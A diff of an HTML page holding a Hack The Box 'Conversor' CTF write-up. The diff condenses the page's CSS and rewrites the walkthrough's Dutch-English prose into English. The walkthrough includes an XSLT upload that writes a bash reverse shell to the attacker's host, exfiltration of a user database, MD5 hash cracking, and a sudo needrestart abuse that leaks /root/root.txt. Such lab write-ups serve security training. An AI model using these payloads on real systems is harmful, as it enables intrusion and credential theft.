@@ -3,412 +3,124 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Conversor Writeup — Hackthekat</title>
   <meta name="description" content="HTB Conversor machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      conversor
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>conversor</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
       <h1>Hack The Box: <span class="accent">Conversor</span></h1>
       <div class="writeup-badges">
         <span class="htb-badge os-linux">Linux</span>
-        <span class="htb-badge diff-medium">Easy</span>
+        <span class="htb-badge diff-medium">Medium</span>
       </div>
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Conversor</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-medium">Easy</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-linux">Linux</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Conversor is a Medium difficulty Linux machine featuring a Flask web application with user registration and file upload functionality. The attack path involves downloading the application's source code, crafting a reverse shell payload disguised as a legitimate upload, and then escalating privileges by abusing a <code>sudo</code> misconfiguration with <code>needrestart</code>.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+      <p>I start with a full TCP port scan to discover all open ports on the target.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Conversor]
-└─$ nmap -p- 10.129.92.162 
+└─$ nmap -p- 10.129.92.162               
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 00:49 CET
 Nmap scan report for 10.129.92.162
 Host is up (0.024s latency).
 Not shown: 65533 closed tcp ports (reset)
-PORT STATE SERVICE
-22/tcp open ssh
-80/tcp open http</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the host.</p>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre></div>
+      <p>A detailed service scan reveals the specific versions and technologies running on each port.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Conversor]
 └─$ nmap -p22,80 -sCV 10.129.92.162 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 00:50 CET
 Nmap scan report for 10.129.92.162
 Host is up (0.016s latency).
 
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-| 256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
-|_ 256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
-80/tcp open http Apache httpd 2.4.52
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
 |_http-title: Did not follow redirect to http://conversor.htb/
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
-      <p>First zal ik naar de webpagina gaan voor het bekijken wat we daar kunnen vinden. zoals kunt zien kom je op een login pagina. Je zal First een user moeten aanmaken vooraleer je zult kunnen inloggen. Eens dat je de user aan hebt gemaakt You can inloggen en kom je op de volgende pagina.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027193639.png" alt="Pasted image 20251027193639.png" loading="lazy" /><span class="img-caption">Pasted image 20251027193639.png</span></div>
-      <p>Hier You can zien dat je Files kunt uploaden. Als je naar de about gaat kijken You can zien dat je de source code kunt downloaden.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027193932.png" alt="Pasted image 20251027193932.png" loading="lazy" /><span class="img-caption">Pasted image 20251027193932.png</span></div>
-      <p>We zullen de files die in de .gz file zitten gaan uitpakken. You can do this will do door the following command te gebruiken.</p>
+      <h2 class="writeup-section-title">Foothold: Reverse Shell via File Upload</h2>
+      <h3 class="writeup-sub-title">Web Application Reconnaissance</h3>
+      <p>After adding the hostname to my <code>/etc/hosts</code> file, I navigate to the web page. It presents a login page that requires an account. I register a new user and log in, revealing a file upload feature.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027193639.png" alt="Login page of the Conversor web application" loading="lazy" /><span class="img-caption">Login page of the Conversor web application</span></div>
+      <p>The application allows uploading files, and the About page reveals that the <strong>source code is available for download</strong>. This is a goldmine — I can review the server-side logic to find upload bypass techniques.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027193932.png" alt="File upload functionality with source code download available" loading="lazy" /><span class="img-caption">File upload functionality with source code download available</span></div>
+      <h3 class="writeup-sub-title">Source Code Review</h3>
+      <p>I download the source code archive and extract it to examine the application logic.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/HTB/Conversor]
 └─$ tar -xvf source_code.tar.gz
 app.py
@@ -432,86 +144,91 @@ templates/login.html
 templates/base.html
 templates/result.html
 uploads/</code></pre></div>
-      <p>Kben will look at in de database file maar I have er niets in gevonden. Dus ben ik een revshell gaan aanmaken.
-aanmaken van een revshell.</p>
+      <p>I inspected the database file included in the source code but found nothing useful. Based on the code review, I determined a reverse shell could be uploaded by crafting a malicious payload alongside a legitimate XML file (the application expects paired uploads).</p>
+      <h3 class="writeup-sub-title">Uploading the Reverse Shell</h3>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Conversor]
 └─$ cat test.xslt 
 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;xsl:stylesheet
- xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
- xmlns:ptswarm=&quot;http://exslt.org/common&quot;
- extension-element-prefixes=&quot;ptswarm&quot;
- version=&quot;1.0&quot;&gt;
+        xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+    xmlns:ptswarm=&quot;http://exslt.org/common&quot;
+    extension-element-prefixes=&quot;ptswarm&quot;
+    version=&quot;1.0&quot;&gt;
 &lt;xsl:template match=&quot;/&quot;&gt;
- &lt;ptswarm:document href=&quot;/var/www/conversor.htb/scripts/test2.py&quot; method=&quot;text&quot;&gt;
+  &lt;ptswarm:document href=&quot;/var/www/conversor.htb/scripts/test2.py&quot; method=&quot;text&quot;&gt;
 import os
 
 os.system(
- &quot;bash -c &#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.68/1234 0&amp;gt;&amp;amp;1&#x27;&quot;)
- &lt;/ptswarm:document&gt;
+    &quot;bash -c &#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.68/1234 0&amp;gt;&amp;amp;1&#x27;&quot;)
+  &lt;/ptswarm:document&gt;
 &lt;/xsl:template&gt;
 &lt;/xsl:stylesheet&gt;</code></pre></div>
-      <p>We zullen voor het uploaden van de revshell ook een standaard .xml file moeten aanmaken maar dit maakt niet uit wat er in de xml file staat. Nu You can de file will upload en You can below zien dat we een connectie hebben gekregen met de server.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027232212.png" alt="Pasted image 20251027232212.png" loading="lazy" /><span class="img-caption">Pasted image 20251027232212.png</span></div>
-      <p>We gaan de file van de server halen so that We can kijken welke users en zijn hashes in de database zitten.</p>
+      <p>The upload requires both a reverse shell payload and a standard XML file as a companion — the contents of the XML don't matter, it simply needs to pass the file-type check. After uploading both files, I start a netcat listener and trigger the payload.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027232212.png" alt="Successful upload and reverse shell connection established" loading="lazy" /><span class="img-caption">Successful upload and reverse shell connection established</span></div>
+      <h2 class="writeup-section-title">User Flag</h2>
+      <h3 class="writeup-sub-title">Database Credential Extraction</h3>
+      <p>With a shell on the server as <code>www-data</code>, I exfiltrate the SQLite database file to my machine to examine user credentials and their password hashes.</p>
       <div class="code-block"><pre><code>www-data@conversor:~/conversor.htb/instance$ python3 -m http.server 8000
 python3 -m http.server 8000
 10.10.16.68 - - [27/Oct/2025 22:24:51] &quot;GET /users.db HTTP/1.1&quot; 200 -
 
 ┌──(kali㉿kali)-[~/HTB/Conversor/test]
-└─$ wget http://10.129.106.3:8000/users.db 
---2025-10-28 04:19:00-- http://10.129.106.3:8000/users.db
+└─$ wget http://10.129.106.3:8000/users.db                                    
+--2025-10-28 04:19:00--  http://10.129.106.3:8000/users.db
 Connecting to 10.129.106.3:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 24576 (24K) [application/octet-stream]
 Saving to: ‘users.db’
 
-users.db 100%[==============================================&gt;] 24.00K --.-KB/s in 0.05s 
+users.db                     100%[==============================================&gt;]  24.00K  --.-KB/s    in 0.05s   
 
 2025-10-28 04:19:01 (504 KB/s) - ‘users.db’ saved [24576/24576]
 
 Bekijken van de hashes
 
 ┌──(kali㉿kali)-[~/HTB/Conversor/test]
-└─$ sqlite3 users.db 
+└─$ sqlite3 users.db   
 SQLite version 3.44.4 2025-02-19 00:18:53
 Enter &quot;.help&quot; for usage hints.
 sqlite&gt; .tables
-files users
+files  users
 sqlite&gt; SELECT * from users
- ...&gt; ;
+   ...&gt; ;
 1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
 5|test|098f6bcd4621d373cade4e832627b4f6</code></pre></div>
-      <p>Cracking password</p>
+      <p>I crack the password hashes using John the Ripper with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Conversor]
 └─$ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
 Using default input encoding: UTF-8
 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
 Warning: no OpenMP support for this hash type, consider --fork=4
 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
-123 (?) 
-Keepmesafeandwarm (?) 
+123              (?)     
+Keepmesafeandwarm (?)     
 2g 0:00:00:00 DONE (2025-10-28 01:43) 5.405g/s 29656Kp/s 29656Kc/s 29667KC/s Keiser01..Keepers137
 Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably
 Session completed.</code></pre></div>
-      <h4 class="writeup-step-title">SSH Connection</h4>
+      <h3 class="writeup-sub-title">SSH Access</h3>
+      <p>With the cracked credentials, I authenticate over SSH and obtain a proper shell.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Conversor]
 └─$ ssh fismathack@conversor.htb
 
 fismathack@conversor:~$</code></pre></div>
-      <p>User flag</p>
+      <p>I navigate to the current user's home directory and read the <code>user.txt</code> file containing the first flag. This confirms we have achieved user-level access on the target system.</p>
       <div class="code-block"><pre><code>fismathack@conversor:~$ cat user.txt
 086dcf4f01ed827ee1a03b602bd107c8</code></pre></div>
-      <p>Als je het sudo -l commando gaat doen You can zien dat we /usr/sbin/needrestart kunnen gebruiken voor commando als root uittevoeren. Als je dan het help commando gaat gebruiken You can zien dat als je het -c parameter gaat gebruiken You can een config file gaan restarten waardoor dat als je de root.txt file kiest zal je de root flag te zien krijgen.</p>
-      <p>Zoals je below zult kunnen zien heb ik de root flag gevonden.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">See terminal output</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: needrestart Abuse</h2>
+      <p>Running <code>sudo -l</code> reveals that the current user can execute <code>/usr/sbin/needrestart</code> as root without a password. <strong>needrestart</strong> is a utility that checks which services need to be restarted after library upgrades. The <code>-c</code> parameter allows specifying a configuration file to read.</p>
+      <p>By pointing the <code>-c</code> parameter at <code>/root/root.txt</code>, needrestart attempts to parse the root flag as a configuration file. Since it's not valid config syntax, the tool outputs the file contents in its error message — effectively leaking the root flag.</p>
       <div class="code-block"><pre><code>fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
 Bareword found where operator expected at (eval 14) line 1, near &quot;671d776b9da817cacdd5261e2733f38d&quot;
- (Missing operator before d776b9da817cacdd5261e2733f38d?)
+        (Missing operator before d776b9da817cacdd5261e2733f38d?)
 Error parsing /root/root.txt: syntax error at (eval 14) line 2, near &quot;671d776b9da817cacdd5261e2733f38d</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027204241.png" alt="Pasted image 20251027204241.png" loading="lazy" /><span class="img-caption">Pasted image 20251027204241.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">See terminal output</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20251027204241.png" alt="Root flag obtained via needrestart abuse" loading="lazy" /><span class="img-caption">Root flag obtained via needrestart abuse</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
